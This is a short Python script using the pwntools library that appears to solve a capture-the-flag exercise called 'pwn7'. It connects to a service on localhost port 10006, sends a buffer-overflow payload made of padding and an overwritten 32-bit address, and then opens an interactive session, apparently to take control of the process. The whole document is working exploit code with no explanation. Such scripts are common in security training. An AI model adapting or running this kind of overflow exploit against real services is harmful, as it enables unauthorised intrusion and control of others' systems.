from pwn import *

context(log_level="debug")

# p = process("./pwn7_")
p = remote("127.0.0.1",10006)
# gdb.attach(p,"b*0x80486cb\nc")
p.recvuntil("\n")
payload = 'a'*(276-28+2)+p32(0x804a080)
p.sendline(payload)
p.interactive()